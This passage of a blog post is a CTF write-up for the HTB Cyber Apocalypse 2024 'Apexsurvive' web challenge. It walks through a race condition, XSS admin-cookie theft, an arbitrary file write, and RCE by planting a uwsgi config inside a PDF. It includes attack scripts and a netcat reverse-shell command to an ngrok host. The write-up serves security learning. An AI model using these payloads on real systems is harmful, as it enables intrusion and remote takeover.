+</span></span><span style="display:flex;"><span>	    <span style="color:#75715e"># critical: must initialize state</span>
+</span></span><span style="display:flex;"><span>        engine<span style="color:#f92672">.</span>queue(update_profile, <span style="color:#e6db74">&#39;test@email.htb&#39;</span>, gate<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;race1&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        engine<span style="color:#f92672">.</span>queue(send_verification, gate<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;race1&#39;</span>)
+</span></span><span style="display:flex;"><span>        engine<span style="color:#f92672">.</span>queue(update_profile, <span style="color:#e6db74">&#39;attacker@apexsurvive.htb&#39;</span>, gate<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;race1&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    engine<span style="color:#f92672">.</span>openGate(<span style="color:#e6db74">&#39;race1&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">handleResponse</span>(req, interesting):
+</span></span><span style="display:flex;"><span>    table<span style="color:#f92672">.</span>add(req)
+</span></span></code></pre></div><p><img src="/posts/apexsurvive-writeup-htb-cyber-apocalypse-2024/turbo-intruder-config.png"></p>
+<p>Let&rsquo;s launch the attack and see what we get:
+<img src="/posts/apexsurvive-writeup-htb-cyber-apocalypse-2024/inbox-apexsurvive-multi.png"></p>
+<p>Out of 10 race condition attempts, we had 3 successful hits where a token intended for <code>attacker@apexsurvive.htb</code> made it to our inbox. The race condition is exploitable after all!</p>
+<p>Now, these verification tokens are not usable because they got superseded by failed attempts, this means we must stop on success to preserve elevated tokens.</p>
+<p>This is doable manually since hit chance is pretty high, but I don&rsquo;t think it would be hard to automate it either.</p>
+<p>Anyways, we are now certain that we can win the race. We did it.</p>
+<h2 id="chapter-6-the-attack-chain">Chapter 6: The Attack Chain<a href="#chapter-6-the-attack-chain" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>With the race condition completed, let&rsquo;s look at our new attack chain:
+<img src="/posts/apexsurvive-writeup-htb-cyber-apocalypse-2024/attack-chain-admin.png"></p>
+<p>We should be able to reach admin easily now.</p>
+<p>Starting with a normal user, we run our race condition payload manually, one-by-one until we get a hit:
+<img src="/posts/apexsurvive-writeup-htb-cyber-apocalypse-2024/inbox-apexsurvive-single.png"></p>
+<p>We then verify our email to unlock the <strong>Internal Settings</strong>
+<img src="/posts/apexsurvive-writeup-htb-cyber-apocalypse-2024/internal-settings.png"></p>
+<p>We then enter a poisoned product into the system:
+<img src="/posts/apexsurvive-writeup-htb-cyber-apocalypse-2024/xss-product-add.png"></p>
+<p>&hellip; and submit it for review by the admin bot:
+<img src="/posts/apexsurvive-writeup-htb-cyber-apocalypse-2024/xss-product-reported.png"></p>
+<p>A few seconds pass, then we receive the exfiltrated admin cookie:
+<img src="/posts/apexsurvive-writeup-htb-cyber-apocalypse-2024/webhook-admin-cookie.png"></p>
+<p>We hijack the admin session and unlock <strong>Admin Settings</strong>
+<img src="/posts/apexsurvive-writeup-htb-cyber-apocalypse-2024/admin-contract.png">
+Also notice our new, admin username: <code>Xclow3n</code>.</p>
+<p>We are now admin. The next goal is RCE, but how?
+<img src="/posts/apexsurvive-writeup-htb-cyber-apocalypse-2024/attack-chain-admin.png"></p>
+<p>With our newly-acquired privileges, let&rsquo;s reevaluate our new building blocks. Remember our methodology pep-talk earlier?</p>
+<p>We have one new endpoint exclusively available to admin users: <code>/addContract</code></p>
+<p>Let&rsquo;s give it some scrutiny:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#a6e22e">@api.route</span>(<span style="color:#e6db74">&#39;/addContract&#39;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#39;POST&#39;</span>])
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@isAuthenticated</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@isVerified</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@isInternal</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@isAdmin</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@antiCSRF</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@sanitizeInput</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">addContract</span>(decodedToken):
+</span></span><span style="display:flex;"><span>    name <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>form<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;name&#39;</span>, <span style="color:#e6db74">&#39;&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    uploadedFile <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>files[<span style="color:#e6db74">&#39;file&#39;</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> uploadedFile <span style="color:#f92672">or</span> <span style="color:#f92672">not</span> name:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> response(<span style="color:#e6db74">&#39;All files required!&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> uploadedFile<span style="color:#f92672">.</span>filename <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;&#39;</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> response(<span style="color:#e6db74">&#39;Invalid file!&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    uploadedFile<span style="color:#f92672">.</span>save(<span style="color:#e6db74">&#39;/tmp/temporaryUpload&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    isValidPDF <span style="color:#f92672">=</span> checkPDF()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> isValidPDF:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>            filePath <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(current_app<span style="color:#f92672">.</span>root_path, <span style="color:#e6db74">&#39;contracts&#39;</span>, uploadedFile<span style="color:#f92672">.</span>filename)
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">with</span> open(filePath, <span style="color:#e6db74">&#39;wb&#39;</span>) <span style="color:#66d9ef">as</span> wf:
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#39;/tmp/temporaryUpload&#39;</span>, <span style="color:#e6db74">&#39;rb&#39;</span>) <span style="color:#66d9ef">as</span> fr:
+</span></span><span style="display:flex;"><span>                    wf<span style="color:#f92672">.</span>write(fr<span style="color:#f92672">.</span>read())
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> response(<span style="color:#e6db74">&#39;Contract Added&#39;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
+</span></span><span style="display:flex;"><span>            print(e, file<span style="color:#f92672">=</span>sys<span style="color:#f92672">.</span>stdout)
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> response(<span style="color:#e6db74">&#39;Something went wrong!&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> response(<span style="color:#e6db74">&#39;Invalid PDF! what are you trying to do?&#39;</span>)
+</span></span></code></pre></div><p>I instantly notice a vulnerable concatenation:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(current_app<span style="color:#f92672">.</span>root_path, <span style="color:#e6db74">&#39;contracts&#39;</span>, uploadedFile<span style="color:#f92672">.</span>filename)
+</span></span></code></pre></div><p><code>uploadedFile.filename</code> is directly fed to <code>os.path.join</code> sans validation giving us an <strong>Arbitrary File Write.</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(<span style="color:#e6db74">&#39;/root/directory1/app/&#39;</span>, <span style="color:#e6db74">&#39;contracts&#39;</span>, <span style="color:#e6db74">&#39;/file.txt&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;/file.txt&#39;</span>                      <span style="color:#75715e"># we control this --^</span>
+</span></span></code></pre></div><p>There is catch though: before our AFW vulnerable code gets hit, the uploaded file gets saved to <code>/tmp/temporaryUpload</code> and a function, <code>checkPDF()</code>, is called. Let&rsquo;s see what <code>checkPDF()</code> does:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">checkPDF</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#39;/tmp/temporaryUpload&#39;</span>, <span style="color:#e6db74">&#39;rb&#39;</span>) <span style="color:#66d9ef">as</span> f:
+</span></span><span style="display:flex;"><span>            PdfReader(f, strict<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">False</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">True</span>
+</span></span></code></pre></div><p>It&rsquo;s a simple function that checks if our uploaded file is a correct, parseable PDF document by feeding it to <code>PdfReader</code> from <code>PyPDF2</code> in strict mode.</p>
+<p>I did some digging around but the function seems secure. There seems to be no way around uploading a valid PDF.</p>
+<p>This turn of events restricts us to an <strong>Arbitrary PDF Write</strong> if we may say.</p>
+<p>After some googling, searching for <code>uwsgi file write pdf rce</code> yielded this <a href="https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html">interesting piece</a></p>
+<p>The article uses two &ldquo;features&rdquo; of <code>uwsgi</code> to turn arbitrary file write into code execution.</p>
+<ol>
+<li><code>uwsgi</code> is very flexible when reading its own config files. It scans the configuration file for <code>[uwsgi]</code> and reads configuration from there even if its a binary.</li>
+<li><code>uwsgi</code>&rsquo;s config syntax allows for magic <code>@</code> operators, these provide convenience utilities such as file reading and, you guessed it, command execution.</li>
+</ol>
+<p>We love you, <code>uwsgi</code>.</p>
+<p>The same article suggests embedding the weaponized <code>uwsgi</code> configuration within a JPEG as metadata, packaging that in a PDF, then the final PDF would be your payload.</p>
+<p>They kindly provided a proof-of-concept as well. Let&rsquo;s get to work</p>
+<p>We set up our listeners, I usually use <code>ngrok</code> to obtain a publicly accessible TCP endpoint:
+<img src="/posts/apexsurvive-writeup-htb-cyber-apocalypse-2024/listener-setup.png"></p>
+<p>Let&rsquo;s weaponize an innocent <code>flower.jpg</code>, notice how the payload pads the JPEG metadata with newlines (these are the <code>&amp;#x0a;</code> sequences on either side):</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> fpdf <span style="color:#f92672">import</span> FPDF
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> exiftool <span style="color:#f92672">import</span> ExifToolHelper
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">with</span> ExifToolHelper() <span style="color:#66d9ef">as</span> et:
+</span></span><span style="display:flex;"><span>    et<span style="color:#f92672">.</span>set_tags(
+</span></span><span style="display:flex;"><span>        [<span style="color:#e6db74">&#34;flower.jpg&#34;</span>],
+</span></span><span style="display:flex;"><span>        tags<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#34;model&#34;</span>: <span style="color:#e6db74">&#34;&amp;#x0a;[uwsgi]&amp;#x0a;foo = @(exec://nc 6.tcp.eu.ngrok.io 13278 -e sh)&amp;#x0a;&#34;</span>},
+</span></span><span style="display:flex;"><span>        params<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#34;-E&#34;</span>, <span style="color:#e6db74">&#34;-overwrite_original&#34;</span>]
+</span></span><span style="display:flex;"><span>    )
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">MyFPDF</span>(FPDF):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">pass</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>pdf <span style="color:#f92672">=</span> MyFPDF()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>pdf<span style="color:#f92672">.</span>add_page()
+</span></span><span style="display:flex;"><span>pdf<span style="color:#f92672">.</span>image(<span style="color:#e6db74">&#39;./flower.jpg&#39;</span>)
+</span></span><span style="display:flex;"><span>pdf<span style="color:#f92672">.</span>output(<span style="color:#e6db74">&#39;payload.pdf&#39;</span>, <span style="color:#e6db74">&#39;F&#39;</span>)
+</span></span></code></pre></div><p><img src="/posts/apexsurvive-writeup-htb-cyber-apocalypse-2024/gen-pdf.png"></p>
+<p>Finally, this is our payload, can&rsquo;t be malicious, right?
+<img src="/posts/apexsurvive-writeup-htb-cyber-apocalypse-2024/pdf-payload.png"></p>
+<p>We upload the request through Repeater, setting the filename to <code>/app/uwsgi.ini</code> to overwrite <code>uwsgi</code>&rsquo;s current config file:
+<img src="/posts/apexsurvive-writeup-htb-cyber-apocalypse-2024/repeater-pdf-rce.png"></p>
+<p>Notice how the image metadata (with our <code>uwsgi</code> command) are stored as plaintext within the otherwise encoded PDF; that&rsquo;s because we embedded them inside a JPEG which mainly serves to protect our payload from PDF&rsquo;s compression and encoding features as far as I understand.</p>
+<p>To trigger the command, we must reload <code>uwsgi</code> by modifying a python source file within the application, this is a debug feature enabled in the currently loaded <code>uwsgi.ini</code> through:</p>
+<pre tabindex="0"><code>py-autoreload = 3
+</code></pre><p>For that, we will just overwrite any file say <code>/app/application/database.py</code>. We send our request and&hellip;
+<img src="posts/Apexsurvive%20Writeup%20(HTB%20Cyber%20Apocalypse%202024)/flag.png"></p>
+<p><code>HTB{0H_c0m3_0n_r4c3_c0nd1t10n_4nd_C55_1nj3ct10n_15_F1R3}</code>
+<img src="/posts/apexsurvive-writeup-htb-cyber-apocalypse-2024/attack-chain-complete.png"></p>
+<h2 id="chapter-7-conclusion">Chapter 7: Conclusion<a href="#chapter-7-conclusion" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>This challenge became an instant favorite. It is the most challenging and, by extension, rewarding, web challenge I&rsquo;ve ever solved.</p>
+<p>Indeed, the steps seem pretty straightforward now, but the &ldquo;uncertainty management&rdquo; aspect we discussed is what makes security research a time consuming exercise. You don&rsquo;t know what you are expecting until you find it, and you need lots of grit and confidence to get there.</p>
+<p>Another major part of why I found this challenge extremely interesting is the fact that I have never exploited a race condition before. I genuinely did not know that&rsquo;s a <em>thing</em> you could do.</p>
+<p>It was a mental game more than anything else, me versus a piece of logic.</p>
+<p>At some point, and through a game of elimination, I reached a strong conviction that the only route has to be through <code>isInternal</code>.</p>
+<p>Next, and through another long-winded game of elimination, I reached a conviction that the only way to get <code>isInternal</code> is through a race condition. I got fixated on the race condition, then I pulled it off.</p>
+<p>Visual proof of my somewhat late-night conviction as I explained the situation to my team 😅:
+<img src="/posts/apexsurvive-writeup-htb-cyber-apocalypse-2024/discord.png"></p>
+<p>On a second note, there was so much tangential research that I have not included in this writeup, but that does not mean it was useless. The most rewarding aspect of CTFs are these little, educational journeys you take doing seemingly irrelevant, tangential research.</p>
+<p>CTF after CTF and challenge after challenge, you realize you have accumulated a good variety of information, about seemingly random things, and evidently, that variety is what creates a resourceful, solid cybersecurity engineer.</p>
+<p>Big thanks to my team <strong>PwnSec</strong> for their support, it was beautiful to see the team effort as we collaborated on different categories.</p>
+<p>That&rsquo;s all I got for today, if you made it this far, you deserve a handshake 🤝. See you in the next one 🤍</p>
+
+      </div></div>
+
+  
+  
+<div class="pagination">
+    <div class="pagination__title">
+        <span class="pagination__title-h">Read other posts</span>
+        <hr />
+    </div>
+    <div class="pagination__buttons">
+        
+        <span class="button previous">
+            <a href="//localhost:1313/posts/bom-sniffing-to-xss/">
+                <span class="button__icon">←</span>
+                <span class="button__text">BOM Sniffing to XSS</span>
+            </a>
+        </span>
+        
+        
+        <span class="button next">
+            <a href="//localhost:1313/posts/a-team-of-beginners-face-an-elite-ctf/">
+                <span class="button__text">Google CTF 2023 And How It Almost Backfired</span>
+                <span class="button__icon">→</span>
+            </a>
+        </span>
+        
+    </div>
+</div>
+
+  
+
+  <div id="disqus_thread"></div>
+<script>
+    window.disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "elmosalamy" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</div>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2025 Powered by <a href="http://gohugo.io">Hugo</a></span>
+    
+        <span>:: Theme made by <a href="https://twitter.com/panr">panr</a></span>
+      </div>
+  </div>
+</footer>
+
+<script src="//localhost:1313/assets/main.js"></script>
+<script src="//localhost:1313/assets/prism.js"></script>
+
+
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
